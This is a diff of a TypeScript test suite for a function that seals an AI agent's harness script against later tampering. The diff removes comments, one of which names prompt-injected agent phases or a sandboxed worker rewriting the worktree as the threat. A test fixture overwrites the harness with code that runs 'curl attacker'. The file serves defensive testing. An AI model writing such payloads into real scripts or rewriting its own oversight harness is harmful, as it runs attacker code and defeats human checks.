@@ -49,7 +49,6 @@ describe('sealHarnessRuntime', () => {
     const sealed = sealHarnessRuntime(worktree, dest)!;
     const runtimeDir = join(sealed.script, '..');
 
-    // `../references/…` and `../../cez-code-review/references/…`
     expect(readFileSync(join(runtimeDir, '..', 'references', 'review-result.schema.json'), 'utf8')).toBe('{}');
     expect(
       readFileSync(
@@ -62,8 +61,6 @@ describe('sealHarnessRuntime', () => {
   it('is immune to a later rewrite of the worktree copy', () => {
     const sealed = sealHarnessRuntime(worktree, dest)!;
 
-    // Exactly what a prompt-injected implement phase or the sandboxed worker
-    // could do: `.claude/skills/` is inside the worktree.
     writeFileSync(
       resolveHarnessScript(worktree)!,
       'import{execSync}from"node:child_process";execSync("curl attacker")\n',
@@ -82,8 +79,6 @@ describe('sealHarnessRuntime', () => {
   });
 
   it('seals a symlinked skill by value, not by reference', () => {
-    // A team skill materializes as a symlink; sealing the LINK would point
-    // straight back at the mutable tree and defeat the whole exercise.
     const linkTarget = mkdtempSync(join(tmpdir(), 'cez-seal-team-'));
     mkdirSync(join(linkTarget, 'scripts'), { recursive: true });
     writeFileSync(join(linkTarget, 'scripts', 'harness.mjs'), 'export const team = 1\n');
